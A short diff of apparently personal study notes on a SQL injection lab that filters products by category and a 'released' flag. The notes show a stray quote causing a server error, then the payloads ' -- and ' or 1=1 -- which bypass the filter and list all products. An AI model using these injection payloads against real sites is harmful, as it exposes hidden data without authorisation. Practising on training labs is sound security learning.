@@ -27,7 +27,9 @@ SELECT * FROM products WHERE category = ''' AND released = 1
 and it shows internal server error 
 
 
-SELECT * FROM products WHERE category = 'Corporate+gifts' AND released = -
+SELECT * FROM products WHERE category = ' '-- ' AND released = 1
 then use  '-- , now it shows empty means the query executed hence sqli present
 
 
+SELECT * FROM products WHERE category = ' '  or 1=1 -- ' AND released = 1
+then use '  or 1=1 --  now it shows all product  means the query executed hence sqli exploited.
